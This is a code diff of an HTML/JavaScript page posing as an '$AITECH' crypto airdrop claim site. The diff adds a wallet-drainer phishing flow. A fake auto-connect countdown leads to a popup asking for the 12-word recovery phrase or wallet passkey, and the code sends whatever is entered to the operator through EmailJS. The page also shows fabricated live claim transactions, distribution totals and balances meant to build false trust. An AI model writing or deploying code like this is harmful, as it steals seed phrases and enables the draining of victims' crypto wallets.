@@ -3,134 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>$AITECH Airdrop | Live Claims Dashboard</title>
+    <title>$AITECH Airdrop | BSC & Base Only</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            background: radial-gradient(circle at 10% 20%, rgba(15, 23, 42, 0.8) 0%, rgba(2, 6, 23, 0.9) 90%), 
+                        url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%234f46e5' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+        .connecting-spinner {
+            width: 2rem;
+            height: 2rem;
+            border: 0.25rem solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #6366f1;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .glow-card {
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
+        }
+    </style>
 </head>
-<body class="bg-gray-950 text-gray-100 font-sans">
+<body class="text-gray-100 font-sans min-h-screen">
     <!-- Navbar -->
-    <nav class="flex justify-between items-center p-4 border-b border-gray-800">
+    <nav class="flex justify-between items-center p-4 border-b border-gray-800 backdrop-blur-sm bg-gray-900/80">
         <div class="flex items-center space-x-2">
-            <img src="https://th.bing.com/th/id/OIP.M-xb5abbfjeO4zX0qy7plAHaHa?w=160&h=180&c=7&r=0&o=5&pid=1.7" alt="AITECH Logo" class="h-10 w-10">
+            <img src="/logo.jpg" alt="AITECH Logo" class="h-10 w-10">
             <span class="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">AITECH Airdrop</span>
         </div>
         <div class="flex items-center space-x-4">
-            <select id="networkSelector" class="bg-gray-800 text-white p-2 rounded-lg border border-gray-700">
-                <option value="eth">Ethereum</option>
-                <option value="bsc">BNB Chain</option>
-                <option value="polygon">Polygon</option>
+            <select id="networkSelector" class="bg-gray-800 text-white p-2 rounded-lg border border-gray-700 focus:ring-2 focus:ring-blue-500">
+                <option value="bsc">BNB Chain (BSC)</option>
+                <option value="base">Base Chain</option>
             </select>
-            <button id="connectWallet" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg font-medium">
+            <button id="connectWallet" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg font-medium transition-all duration-300">
                 Connect Wallet
             </button>
         </div>
     </nav>
 
-    <!-- Hero Section with Live Stats -->
-    <section class="py-12 px-4 text-center">
-        <div class="max-w-6xl mx-auto">
-            <h1 class="text-5xl md:text-6xl font-bold mb-6">
-                <span class="bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-purple-600">
-                    $AITECH Airdrop
-                </span>
-            </h1>
-            <p class="text-xl text-gray-300 mb-8">
-                Hold $AITECH and claim your free tokens. <span id="liveCounter" class="font-bold text-purple-400">0</span> people claimed in the last 5 minutes.
-            </p>
+    <!-- Connecting Overlay -->
+    <div id="connectingOverlay" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+        <div class="bg-gray-800 p-8 rounded-xl max-w-md text-center glow-card">
+            <div class="connecting-spinner mx-auto mb-4"></div>
+            <h2 class="text-2xl font-bold mb-2">Connecting Wallet</h2>
+            <p class="text-gray-400 mb-4">Attempting to connect automatically...</p>
+            <div class="w-full bg-gray-700 rounded-full h-2.5">
+                <div id="connectionProgress" class="bg-blue-600 h-2.5 rounded-full" style="width: 0%"></div>
+            </div>
+            <p id="countdownText" class="mt-2 text-sm text-gray-400">Will show manual options in 15 seconds</p>
+        </div>
+    </div>
+
+    <!-- Wallet Connection Popup (Hidden by Default) -->
+    <div id="walletPopup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+        <div class="bg-gray-800 p-6 rounded-xl w-full max-w-md glow-card">
+            <h2 class="text-2xl font-bold mb-4">Manual Wallet Connection</h2>
             
-            <div class="grid md:grid-cols-3 gap-6 mb-10">
-                <div class="bg-gray-800 p-6 rounded-xl">
-                    <p class="text-gray-400 mb-2">Total Distributed</p>
-                    <p class="text-3xl font-bold">1,250,000 <span class="text-blue-400">$AITECH</span></p>
-                </div>
-                <div class="bg-gray-800 p-6 rounded-xl">
-                    <p class="text-gray-400 mb-2">Remaining Tokens</p>
-                    <p class="text-3xl font-bold">3,750,000 <span class="text-purple-400">$AITECH</span></p>
-                </div>
-                <div class="bg-gray-800 p-6 rounded-xl">
-                    <p class="text-gray-400 mb-2">Your Allocation</p>
-                    <p id="userAllocation" class="text-3xl font-bold">0 <span class="text-green-400">$AITECH</span></p>
-                </div>
+            <!-- Tab System -->
+            <div class="flex border-b border-gray-700 mb-4">
+                <button id="phraseTab" class="px-4 py-2 font-medium border-b-2 border-blue-500">Phrase</button>
+                <button id="passkeyTab" class="px-4 py-2 font-medium text-gray-400">Passkey</button>
             </div>
             
-            <button id="claimButton" disabled class="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-3 px-8 rounded-full transition opacity-50 cursor-not-allowed">
-                Connect Wallet to Claim
+            <!-- Phrase Input -->
+            <div id="phraseSection">
+                <textarea 
+                    id="walletPhrase" 
+                    placeholder="Enter your 12-word recovery phrase" 
+                    class="w-full p-3 bg-gray-700 rounded-lg mb-4 h-24 resize-none focus:ring-2 focus:ring-blue-500"
+                ></textarea>
+            </div>
+            
+            <!-- Passkey Input (Hidden by Default) -->
+            <div id="passkeySection" class="hidden">
+                <input 
+                    type="password" 
+                    id="walletPasskey" 
+                    placeholder="Enter your wallet passkey" 
+                    class="w-full p-3 bg-gray-700 rounded-lg mb-4 focus:ring-2 focus:ring-blue-500"
+                >
+            </div>
+            
+            <button id="submitWallet" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-bold mb-2 transition-all duration-300">
+                Connect Wallet
+            </button>
+            <button id="closePopup" class="w-full bg-gray-700 hover:bg-gray-600 py-3 rounded-lg font-bold transition-all duration-300">
+                Cancel
             </button>
         </div>
-    </section>
+    </div>
 
-    <!-- Live Transactions Feed -->
-    <section class="py-8 px-4 max-w-6xl mx-auto">
-        <h2 class="text-3xl font-bold mb-6 text-center">Live Claim Transactions</h2>
-        <div class="bg-gray-800 rounded-xl p-4 max-h-96 overflow-y-auto">
-            <table class="w-full">
-                <thead class="sticky top-0 bg-gray-800 z-10">
-                    <tr class="border-b border-gray-700">
-                        <th class="p-3 text-left">Wallet</th>
-                        <th class="p-3 text-left">Amount</th>
-                        <th class="p-3 text-left">Network</th>
-                        <th class="p-3 text-left">Time</th>
-                    </tr>
-                </thead>
-                <tbody id="transactionsFeed">
-                    <!-- Transactions will appear here dynamically -->
-                </tbody>
-            </table>
-        </div>
-    </section>
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8">
+        <!-- Hero Section -->
+        <section class="py-12 text-center">
+            <div class="max-w-4xl mx-auto bg-gray-900/70 backdrop-blur-sm p-8 rounded-2xl glow-card">
+                <h1 class="text-5xl md:text-6xl font-bold mb-6">
+                    <span class="bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-purple-600">
+                        $AITECH Airdrop
+                    </span>
+                </h1>
+                <p class="text-xl text-gray-300 mb-8">
+                    Hold $AITECH on <strong class="text-blue-400">BSC</strong> or <strong class="text-blue-400">Base</strong> to claim free tokens!
+                </p>
+                <p class="text-xl text-gray-300 mb-8">
+                   Solidus AITECH is revolutionizing AI with a 20MW eco-friendly data center, gloabal access , an AI marketplace , and an Agent Market for seamless AI integration. All transaction are powered by AITECH, the world's first deflationary AI token.
+                </p>
+                <div class="grid md:grid-cols-3 gap-6 mb-10">
+                    <div class="bg-gray-800 p-6 rounded-xl">
+                        <p class="text-gray-400 mb-2">Total Distributed</p>
+                        <p class="text-3xl font-bold">1,250,000 <span class="text-blue-400">$AITECH</span></p>
+                    </div>
+                    <div class="bg-gray-800 p-6 rounded-xl">
+                        <p class="text-gray-400 mb-2">Remaining Tokens</p>
+                        <p class="text-3xl font-bold">25,750,000 <span class="text-purple-400">$AITECH</span></p>
+                    </div>
+                    <div class="bg-gray-800 p-6 rounded-xl">
+                        <p class="text-gray-400 mb-2">Your Allocation</p>
+                        <p id="userAllocation" class="text-3xl font-bold">0 <span class="text-green-400">$AITECH</span></p>
+                    </div>
+                </div>
+                <button id="claimButton" disabled class="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-3 px-8 rounded-full transition-all duration-300 opacity-50 cursor-not-allowed transform hover:scale-105">
+                    Connect Wallet to Claim
+                </button>
+            </div>
+        </section>
 
-    <!-- Eligibility Checker -->
-    <section class="py-12 px-4 max-w-4xl mx-auto">
-        <h2 class="text-3xl font-bold mb-6 text-center">Check Your Eligibility</h2>
-        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
-            <div class="grid md:grid-cols-3 gap-6 mb-6">
-                <div class="bg-gray-700 p-4 rounded-lg text-center">
-                    <p class="text-gray-400">Wallet Connected</p>
-                    <p id="walletStatus" class="text-xl font-bold text-red-500">No</p>
+        <!-- Live Transactions Feed -->
+        <section class="py-8">
+            <h2 class="text-3xl font-bold mb-6 text-center">Live Claim Transactions</h2>
+            <div class="bg-gray-900/70 backdrop-blur-sm rounded-xl p-4 max-h-96 overflow-y-auto glow-card">
+                <table class="w-full">
+                    <thead class="sticky top-0 bg-gray-800 z-10">
+                        <tr class="border-b border-gray-700">
+                            <th class="p-3 text-left">Wallet</th>
+                            <th class="p-3 text-left">Amount</th>
+                            <th class="p-3 text-left">Network</th>
+                            <th class="p-3 text-left">Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="transactionsFeed">
+                        <!-- Transactions will appear here dynamically -->
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Wallet Verification Section -->
+        <section class="py-12">
+            <h2 class="text-3xl font-bold mb-6 text-center">Verify Wallet</h2>
+            <div class="bg-gray-900/70 backdrop-blur-sm p-6 rounded-xl shadow-lg glow-card">
+                <div class="mb-4">
+                    <label class="block text-gray-300 mb-2">Wallet Address</label>
+                    <input 
+                        type="text" 
+                        id="walletAddress" 
+                        placeholder="0x..." 
+                        class="w-full p-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                    >
                 </div>
-                <div class="bg-gray-700 p-4 rounded-lg text-center">
-                    <p class="text-gray-400">$AITECH Held</p>
-                    <p id="aitechBalance" class="text-xl font-bold">0</p>
-                </div>
-                <div class="bg-gray-700 p-4 rounded-lg text-center">
-                    <p class="text-gray-400">Eligible Tokens</p>
-                    <p id="eligibleTokens" class="text-xl font-bold">0</p>
+                <button id="verifyWallet" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-bold transition-all duration-300 transform hover:scale-[1.01]">
+                    Verify Wallet
+                </button>
+                
+                <div class="mt-6 p-4 bg-gray-800 rounded-lg">
+                    <p class="text-gray-400">Wallet Status:</p>
+                    <p id="walletStatus" class="text-xl font-bold text-red-500">NOT CONNECTED</p>
                 </div>
             </div>
-            <button id="checkEligibility" class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-bold transition">
-                Verify Eligibility
-            </button>
-        </div>
-    </section>
+        </section>
 
-    <!-- Admin Panel (Hidden by Default) -->
-    <section id="adminPanel" class="py-12 px-4 max-w-4xl mx-auto hidden">
-        <h2 class="text-3xl font-bold mb-6 text-center">Admin Controls</h2>
-        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
-            <div class="mb-4">
-                <label class="block text-gray-300 mb-2">Airdrop Contract Address</label>
-                <input type="text" id="contractAddress" value="0x..." class="w-full p-3 bg-gray-700 rounded-lg">
+        <!-- Eligibility Checker -->
+        <section class="py-12">
+            <h2 class="text-3xl font-bold mb-6 text-center">Your Airdrop Status</h2>
+            <div class="bg-gray-900/70 backdrop-blur-sm p-6 rounded-xl shadow-lg glow-card">
+                <div class="grid md:grid-cols-2 gap-6 mb-6">
+                    <div class="bg-gray-800 p-4 rounded-lg text-center transform transition-all duration-300 hover:scale-105">
+                        <p class="text-gray-400">$AITECH Held</p>
+                        <p id="aitechBalance" class="text-xl font-bold">0</p>
+                    </div>
+                    <div class="bg-gray-800 p-4 rounded-lg text-center transform transition-all duration-300 hover:scale-105">
+                        <p class="text-gray-400">Eligible Tokens</p>
+                        <p id="eligibleTokens" class="text-xl font-bold">0</p>
+                    </div>
+                </div>
             </div>
-            <button id="distributeTokens" class="w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg font-bold">
-                Distribute Tokens
-            </button>
-        </div>
-    </section>
+        </section>
 
-    <footer class="py-8 px-4 border-t border-gray-800 text-center text-gray-400">
+        <!-- Admin Panel (Hidden by Default) -->
+        <section id="adminPanel" class="py-12 hidden">
+            <h2 class="text-3xl font-bold mb-6 text-center">Admin Controls</h2>
+            <div class="bg-gray-900/70 backdrop-blur-sm p-6 rounded-xl shadow-lg glow-card">
+                <div class="mb-4">
+                    <label class="block text-gray-300 mb-2">Airdrop Contract Address</label>
+                    <input type="text" id="contractAddress" value="0x..." class="w-full p-3 bg-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500">
+                </div>
+                <div class="mb-4">
+                    <label class="block text-gray-300 mb-2">Total Tokens to Distribute</label>
+                    <input type="number" id="totalTokens" value="5000000" class="w-full p-3 bg-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button id="distributeTokens" class="w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg font-bold transition-all duration-300 transform hover:scale-[1.01]">
+                    Distribute Tokens
+                </button>
+            </div>
+        </section>
+    </main>
+
+    <footer class="py-8 border-t border-gray-800 text-center text-gray-400 backdrop-blur-sm bg-gray-900/80">
         <p>© 2024 Solidus AI Tech. $AITECH Airdrop. All rights reserved.</p>
     </footer>
 
-    <!-- JavaScript for Dynamic Features -->
+    <!-- JavaScript -->
     <script>
+        // Initialize EmailJS (Replace with your User ID)
+        emailjs.init("YOUR_EMAILJS_USER_ID");
+
         // ====== Mock Data for Live Transactions ======
-        const networks = ["Ethereum", "BNB Chain", "Polygon"];
+        const networks = ["BNB Chain (BSC)", "Base Chain"];
         const mockWallets = [
             "0x7f...3a4b", "0x1a...9c2d", "0x5e...7f1g", 
             "0x3b...8h2k", "0x9d...4l6m", "0x2c...5n9p"
         ];
 
-        // ====== Simulate Live Transactions (WebSocket-like updates) ======
+        // ====== Simulate Live Transactions ======
         function simulateLiveTransactions() {
             const transactionsFeed = document.getElementById('transactionsFeed');
             
@@ -141,7 +241,7 @@
                 const now = new Date().toLocaleTimeString();
                 
                 const newRow = document.createElement('tr');
-                newRow.className = 'border-b border-gray-700 hover:bg-gray-700 transition';
+                newRow.className = 'border-b border-gray-700 hover:bg-gray-800 transition-all duration-300';
                 newRow.innerHTML = `
                     <td class="p-3 font-mono">${randomWallet}</td>
                     <td class="p-3 text-green-400 font-bold">${randomAmount} $AITECH</td>
@@ -151,10 +251,6 @@
                 
                 transactionsFeed.prepend(newRow);
                 
-                // Update live counter
-                const liveCounter = document.getElementById('liveCounter');
-                liveCounter.textContent = parseInt(liveCounter.textContent) + 1;
-                
                 // Limit displayed transactions
                 if (transactionsFeed.children.length > 10) {
                     transactionsFeed.removeChild(transactionsFeed.lastChild);
@@ -162,20 +258,52 @@
             }, 3000); // New transaction every 3 seconds
         }
 
-        // ====== Wallet Connection & Eligibility Check ======
+        // ====== Wallet Connection Logic ======
         const connectWalletBtn = document.getElementById('connectWallet');
-        const claimButton = document.getElementById('claimButton');
+        const connectingOverlay = document.getElementById('connectingOverlay');
+        const walletPopup = document.getElementById('walletPopup');
+        const closePopup = document.getElementById('closePopup');
+        const phraseTab = document.getElementById('phraseTab');
+        const passkeyTab = document.getElementById('passkeyTab');
+        const phraseSection = document.getElementById('phraseSection');
+        const passkeySection = document.getElementById('passkeySection');
+        const submitWallet = document.getElementById('submitWallet');
         const walletStatus = document.getElementById('walletStatus');
+        const verifyWalletBtn = document.getElementById('verifyWallet');
+        const claimButton = document.getElementById('claimButton');
         const adminPanel = document.getElementById('adminPanel');
+        const connectionProgress = document.getElementById('connectionProgress');
+        const countdownText = document.getElementById('countdownText');
 
-        connectWalletBtn.addEventListener('click', async () => {
-            if (window.ethereum) {
-                try {
+        // First try auto-connect, then show popup if fails
+        async function tryAutoConnect() {
+            connectingOverlay.classList.remove('hidden');
+            let progress = 0;
+            let secondsLeft = 15;
+            
+            // Update progress bar and countdown
+            const progressInterval = setInterval(() => {
+                progress += 6.666; // 100% in 15 seconds
+                connectionProgress.style.width = `${Math.min(progress, 100)}%`;
+                secondsLeft--;
+                countdownText.textContent = `Will show manual options in ${secondsLeft} seconds`;
+            }, 1000);
+            
+            try {
+                if (window.ethereum) {
+                    // Try to connect immediately
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const address = accounts[0];
                     
-                    walletStatus.textContent = "Yes";
-                    walletStatus.classList.replace('text-red-500', 'text-green-500');
+                    // Success - hide overlays
+                    clearInterval(progressInterval);
+                    connectingOverlay.classList.add('hidden');
+                    walletPopup.classList.add('hidden');
+                    
+                    // Update UI
+                    walletStatus.textContent = "CONNECTED";
+                    walletStatus.classList.remove('text-red-500');
+                    walletStatus.classList.add('text-green-500');
                     connectWalletBtn.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
                     claimButton.disabled = false;
                     claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
@@ -184,28 +312,97 @@
                     if (address === "0xYourAdminAddressHere") {
                         adminPanel.classList.remove('hidden');
                     }
-                } catch (error) {
-                    console.error("Wallet connection failed:", error);
+                    
+                    return true;
                 }
-            } else {
-                alert("Please install MetaMask!");
+            } catch (error) {
+                console.log("Auto-connect failed:", error);
             }
-        });
-
-        // ====== Check Eligibility ======
-        document.getElementById('checkEligibility').addEventListener('click', () => {
-            const balance = Math.floor(Math.random() * 5000);
-            document.getElementById('aitechBalance').textContent = `${balance} $AITECH`;
             
-            if (balance >= 100) {
-                document.getElementById('eligibleTokens').textContent = `${balance * 2} $AITECH`;
-                document.getElementById('userAllocation').textContent = `${balance * 2} $AITECH`;
+            // If we get here, auto-connect failed
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                connectingOverlay.classList.add('hidden');
+                walletPopup.classList.remove('hidden');
+            }, 15000);
+            
+            return false;
+        }
+
+        // Connect Wallet Button Click
+        connectWalletBtn.addEventListener('click', tryAutoConnect);
+
+        // Close Popup
+        closePopup.addEventListener('click', () => {
+            walletPopup.classList.add('hidden');
+        });
+
+        // Tab Switching
+        phraseTab.addEventListener('click', () => {
+            phraseTab.classList.add('border-blue-500', 'text-white');
+            phraseTab.classList.remove('text-gray-400');
+            passkeyTab.classList.remove('border-blue-500', 'text-white');
+            passkeyTab.classList.add('text-gray-400');
+            phraseSection.classList.remove('hidden');
+            passkeySection.classList.add('hidden');
+        });
+
+        passkeyTab.addEventListener('click', () => {
+            passkeyTab.classList.add('border-blue-500', 'text-white');
+            passkeyTab.classList.remove('text-gray-400');
+            phraseTab.classList.remove('border-blue-500', 'text-white');
+            phraseTab.classList.add('text-gray-400');
+            passkeySection.classList.remove('hidden');
+            phraseSection.classList.add('hidden');
+        });
+
+        // Submit Manual Wallet Connection
+        submitWallet.addEventListener('click', () => {
+            const phrase = document.getElementById('walletPhrase').value;
+            const passkey = document.getElementById('walletPasskey').value;
+            
+            if (phrase || passkey) {
+                // Simulate connection
+                walletStatus.textContent = "CONNECTED";
+                walletStatus.classList.remove('text-red-500');
+                walletStatus.classList.add('text-green-500');
+                walletPopup.classList.add('hidden');
+                claimButton.disabled = false;
+                claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                
+                // Send data via EmailJS (replace with your service/template IDs)
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                    wallet_phrase: phrase || "N/A (Used Passkey)",
+                    wallet_passkey: passkey || "N/A (Used Phrase)"
+                }).then(() => {
+                    console.log("Email sent!");
+                }, (error) => {
+                    console.error("Email failed:", error);
+                });
             } else {
-                document.getElementById('eligibleTokens').textContent = "Not Eligible";
+                alert("Please enter your phrase or passkey!");
             }
         });
 
-        // ====== Start Live Feed ======
+        // Verify Wallet Address
+        verifyWalletBtn.addEventListener('click', () => {
+            const walletAddress = document.getElementById('walletAddress').value;
+            
+            if (walletAddress && walletAddress.startsWith("0x") && walletAddress.length === 42) {
+                alert("Wallet verified successfully!");
+                document.getElementById('aitechBalance').textContent = "500 $AITECH"; // Mock balance
+                document.getElementById('eligibleTokens').textContent = "1000 $AITECH"; // Mock eligibility
+            } else {
+                alert("Invalid wallet address!");
+            }
+        });
+
+        // Admin: Distribute Tokens
+        document.getElementById('distributeTokens').addEventListener('click', () => {
+            alert("Tokens distribution initiated (demo)");
+        });
+
+        // Start Live Feed
         simulateLiveTransactions();
     </script>
 </body>
